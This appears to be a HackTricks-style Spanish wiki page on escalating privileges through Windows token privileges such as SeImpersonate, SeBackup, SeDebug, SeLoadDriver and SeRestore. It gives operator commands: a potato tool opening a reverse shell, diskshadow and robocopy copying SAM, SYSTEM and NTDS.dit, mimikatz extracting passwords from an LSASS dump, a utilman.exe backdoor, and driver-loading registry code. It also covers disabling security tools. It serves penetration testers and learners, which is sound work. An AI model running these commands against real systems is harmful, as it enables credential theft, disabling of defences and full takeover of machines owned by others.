# Abusando de Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Si **no sabes qué son los Windows Access Tokens**, lee esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Es posible que puedas escalar privilegios abusando de los tokens que ya tienes.**

### SeImpersonatePrivilege

Este privilegio permite a un proceso suplantar, pero no crear, un token cuando puede obtener un handle a dicho token. Es posible adquirir un token privilegiado desde un servicio de Windows (DCOM) haciendo que realice una autenticación NTLM contra un exploit y, posteriormente, habilitando la ejecución de un proceso con privilegios de SYSTEM.<sup>[[2]](#references)</sup> Esta primitiva puede explotarse utilizando herramientas como [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requiere que WinRM esté deshabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) y [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Notas modernas para operadores:

- **JuicyPotato es obsoleto**: en Windows 10 1809+/Server 2019+, se recomienda utilizar **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** o **PrintSpoofer**, dependiendo de qué superficie RPC/COM siga siendo accesible.
- Si has comprometido un servicio que se ejecuta como **`LOCAL SERVICE`** o **`NETWORK SERVICE`** y `whoami /priv` muestra un **filtered token** sin `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupera primero el **conjunto de privilegios predeterminado** de la cuenta (por ejemplo, con **FullPowers**) y vuelve a intentar posteriormente con la familia de herramientas potato.<sup>[[3]](#references)</sup>
- Algunas forks más recientes son más prácticas para los operadores que las herramientas originales. Por ejemplo, **SigmaPotato** añade ejecución mediante reflection/en memoria y compatibilidad con versiones modernas de Windows, mientras que **PrintNotifyPotato** abusa del servicio COM PrintNotify y suele ser útil cuando la ruta clásica del Spooler está deshabilitada.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es muy similar a **SeImpersonatePrivilege**; utilizará el **mismo método** para obtener un token con privilegios.\
Después, este privilegio permite **asignar un token primario** a un proceso nuevo o suspendido. Con el token de impersonación con privilegios, se puede derivar un token primario (DuplicateTokenEx).\
Con el token, se puede crear un **proceso nuevo** con `CreateProcessAsUser` o crear un proceso suspendido y **establecer el token** (por lo general, no se puede modificar el token primario de un proceso en ejecución).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Si tienes este token habilitado, puedes usar **KERB_S4U_LOGON** para obtener un **token de impersonación** de cualquier otro usuario sin conocer las credenciales, **añadir un grupo arbitrario** (admins) al token, establecer el **nivel de integridad** del token en "**medium**" y asignar este token al **hilo actual** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Este privilegio hace que el sistema **conceda acceso de lectura** a cualquier archivo (limitado a operaciones de lectura). Se utiliza para **leer los hashes de contraseñas de las cuentas Administrator locales** desde el registro, tras lo cual se pueden usar herramientas como "**psexec**" o "**wmiexec**" con el hash (técnica Pass-the-Hash). Sin embargo, esta técnica falla en dos condiciones: cuando la cuenta Administrator local está deshabilitada o cuando existe una política que elimina los derechos administrativos de los Local Administrators que se conectan de forma remota.<sup>[[2]](#references)</sup>\
En la práctica, el flujo de trabajo integrado más fiable suele ser **VSS + `robocopy /b`**: crear/exponer una copia shadow y después copiar `SAM`/`SYSTEM` o `NTDS.dit` en **modo de backup**, lo que evita las ACL de los archivos.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Puedes **abusar de este privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- siguiendo a **IppSec** en [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- O como se explica en la sección **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Este privilegio proporciona permiso de **acceso de escritura** a cualquier archivo del sistema, independientemente de la Access Control List (ACL) del archivo. Abre numerosas posibilidades para la escalada, incluida la capacidad de **modificar servicios**, realizar DLL Hijacking y establecer **depuradores** mediante Image File Execution Options, entre otras técnicas.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege es un permiso potente, especialmente útil cuando un usuario posee la capacidad de suplantar tokens, pero también en ausencia de SeImpersonatePrivilege. Esta capacidad depende de poder suplantar un token que represente al mismo usuario y cuyo nivel de integridad no supere el del proceso actual.<sup>[[2]](#references)</sup>

**Puntos clave:**

- **Suplantación sin SeImpersonatePrivilege:** Es posible aprovechar SeCreateTokenPrivilege para EoP suplantando tokens bajo condiciones específicas.
- **Condiciones para la suplantación de tokens:** Para que la suplantación tenga éxito, el token objetivo debe pertenecer al mismo usuario y tener un nivel de integridad menor o igual que el nivel de integridad del proceso que intenta realizar la suplantación.
- **Creación y modificación de tokens de suplantación:** Los usuarios pueden crear un token de suplantación y mejorarlo añadiendo el SID (Security Identifier) de un grupo privilegiado.

### SeLoadDriverPrivilege

Este privilegio permite a un proceso **cargar y descargar controladores de dispositivos** mediante la creación de una entrada del registro con valores `ImagePath` y `Type` específicos. Dado que el acceso de escritura directo a `HKLM` (HKEY_LOCAL_MACHINE) está restringido, se puede utilizar `HKCU` (HKEY_CURRENT_USER). Sin embargo, se requiere una ruta específica para que el kernel reconozca la entrada de `HKCU` como una configuración de controlador.<sup>[[2]](#references)</sup>

El uso ofensivo moderno normalmente consiste en **BYOVD** (bring your own vulnerable driver): cargar un controlador del kernel **firmado pero vulnerable** y utilizar después sus IOCTLs para deshabilitar protecciones o ejecutar código en el kernel. Ten en cuenta que, en versiones recientes de Windows 11/Server, la **Microsoft vulnerable driver blocklist** y/o **HVCI/Memory Integrity** suelen impedir las cadenas antiguas disponibles públicamente, por lo que los ejemplos clásicos del estilo `szkg64.sys` ya no son universalmente fiables.

Esta ruta es `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, donde `<RID>` es el Relative Identifier del usuario actual. Dentro de `HKCU`, se debe crear toda esta ruta y establecer dos valores:<sup>[[2]](#references)</sup>

- `ImagePath`, que es la ruta al binario que se ejecutará
- `Type`, con un valor de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Pasos a seguir:**

1. Acceder a `HKCU` en lugar de `HKLM` debido al acceso de escritura restringido.
2. Crear la ruta `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, donde `<RID>` representa el Relative Identifier del usuario actual.
3. Establecer `ImagePath` en la ruta de ejecución del binario.
4. Asignar `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Más formas de abusar de este privilegio en [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Esto es similar a **SeRestorePrivilege**. Su función principal permite a un proceso **asumir la propiedad de un objeto**, eludiendo el requisito de acceso discrecional explícito mediante la concesión de derechos de acceso WRITE_OWNER. El proceso consiste primero en obtener la propiedad de la clave del registro prevista para escritura y, después, modificar la DACL para habilitar las operaciones de escritura.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Este privilegio permite **depurar otros procesos**, incluida la lectura y escritura en la memoria. Con este privilegio se pueden emplear diversas estrategias de inyección de memoria capaces de evadir la mayoría de las soluciones antivirus y de prevención de intrusiones en hosts.<sup>[[2]](#references)</sup>

En las versiones modernas de Windows, recuerda que `SeDebugPrivilege` suele ser suficiente para abrir **procesos SYSTEM no protegidos** y duplicar sus tokens, pero **no garantiza** que puedas acceder a **LSASS**. Si **RunAsPPL / LSA Protection** está habilitado, los procesos no protegidos no pueden leer ni inyectar código en LSASS, aunque `SeDebugPrivilege` esté presente. En ese caso, roba un token de otro proceso SYSTEM no PPL o encadena la técnica con un bypass de PPL/BYOVD, en lugar de asumir que `procdump` funcionará. Para consultar un ejemplo completo de copia de tokens usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, revisa [esta página](sedebug-+-seimpersonate-copy-token.md).

#### Volcado de memoria

Puedes usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar la memoria de un proceso**. En concreto, esto puede aplicarse al proceso **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, que se encarga de almacenar las credenciales de los usuarios una vez que estos han iniciado sesión correctamente en un sistema.

A continuación, puedes cargar este volcado en mimikatz para obtener las contraseñas:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Si quieres obtener una shell de `NT SYSTEM`, puedes usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Este derecho (realizar tareas de mantenimiento de volúmenes) permite abrir identificadores de dispositivos de volumen sin formato (por ejemplo, \\.\C:) para realizar operaciones de E/S de disco directas que omiten las ACL de NTFS. Con él puedes copiar los bytes de cualquier archivo del volumen leyendo los bloques subyacentes, lo que permite leer arbitrariamente archivos con información confidencial (por ejemplo, claves privadas de máquina en %ProgramData%\Microsoft\Crypto\, colmenas del registro, SAM/NTDS mediante VSS).<sup>[[5]](#references)</sup> Es especialmente importante en servidores de CA, donde exfiltrar la clave privada de la CA permite falsificar un Golden Certificate para suplantar a cualquier principal.<sup>[[6]](#references)</sup>

Consulta las técnicas y mitigaciones detalladas:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
Los **tokens que aparecen como Disabled** normalmente se pueden habilitar, por lo que a menudo puedes abusar de los privilegios tanto _Enabled_ como _Disabled_.

### Habilitar todos los tokens

Si tienes privilegios deshabilitados, puedes usar el script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos los tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
O el **script** incluido en este [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabla

Lista completa de privilegios de token en [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); el resumen siguiente solo incluye formas directas de explotar el privilegio para obtener una sesión de Admin o leer archivos sensibles.<sup>[[1]](#references)</sup>

| Privilegio                  | Impacto      | Herramienta                    | Ruta de ejecución                                                                                                                                                                                                                                                                                                                                     | Observaciones                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | herramienta de terceros          | _"Permitiría a un usuario suplantar tokens y hacer privesc a nt system utilizando herramientas como potato.exe, rottenpotato.exe y juicypotato.exe"_                                                                                                                                                                                                      | Gracias a [Aurélien Chalot](https://twitter.com/Defte_) por la actualización. Intentaré reformularlo pronto con un formato más parecido a una receta.                                                                                                                                                                                         |
| **`SeBackup`**             | **Amenaza**  | _**Built-in commands**_ | Leer archivos sensibles con `robocopy /b` o helpers de copia específicos compatibles con SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ideal para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` y, en ocasiones, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` es práctico, pero los cmdlets/APIs SeBackup específicos suelen ser más flexibles para archivos bloqueados/abiertos.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | herramienta de terceros          | Crear un token arbitrario, incluidos derechos de Admin local, con `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicar un token SYSTEM **no-PPL** o volcar la memoria de un proceso no protegido.                                                                                                                                                                                                                                                                 | <p>El volcado de LSASS suele estar bloqueado si RunAsPPL/LSA Protection está habilitado.</p><p>El script se encuentra en [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | herramienta de terceros          | Usar **Potato family** / **named-pipe impersonation** para generar SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Es más práctico desde cuentas de servicio como IIS APPPOOL, MSSQL, tareas programadas o cualquier contexto que ya tenga `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | herramienta de terceros          | <p>1. Cargar un kernel driver firmado pero vulnerable (BYOVD)<br>2. Usar los IOCTL del driver para obtener R/W del kernel, deshabilitar herramientas de seguridad o elevar a SYSTEM<br><br>Como alternativa, el privilegio puede utilizarse para descargar drivers relacionados con la seguridad mediante el comando integrado <code>fltMC</code>, es decir, <code>fltMC sysmondrv</code></p>                     | <p>Los drivers públicos más antiguos, como <code>szkg64.sys</code>, se bloquean cada vez más en Windows modernos mediante la lista de bloqueo de drivers vulnerables / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Iniciar PowerShell/ISE con el privilegio SeRestore presente.<br>2. Habilitar el privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Cambiar el nombre de utilman.exe a utilman.old<br>4. Cambiar el nombre de cmd.exe a utilman.exe<br>5. Bloquear la consola y pulsar Win+U</p> | <p>Algunos programas AV pueden detectar el ataque.</p><p>Un método alternativo consiste en reemplazar los binarios de servicios almacenados en "Program Files" utilizando el mismo privilegio.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Cambiar el nombre de cmd.exe a utilman.exe<br>4. Bloquear la consola y pulsar Win+U</p>                                                                                                                                       | <p>Algunos programas AV pueden detectar el ataque.</p><p>Un método alternativo consiste en reemplazar los binarios de servicios almacenados en "Program Files" utilizando el mismo privilegio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | herramienta de terceros          | <p>Manipular tokens para incluir derechos de Admin local. Puede requerir SeImpersonate.</p><p>Pendiente de verificación.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - rutas de explotación desde los privilegios de Windows hasta Admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abuso de privilegios de token para LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – ¡Devuélveme mis privilegios! ¿Por favor?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (el modo de copia de seguridad `/b` omite las comprobaciones de ACL de archivos/carpetas)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Realizar tareas de mantenimiento de volúmenes (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → exfiltración de la clave de CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
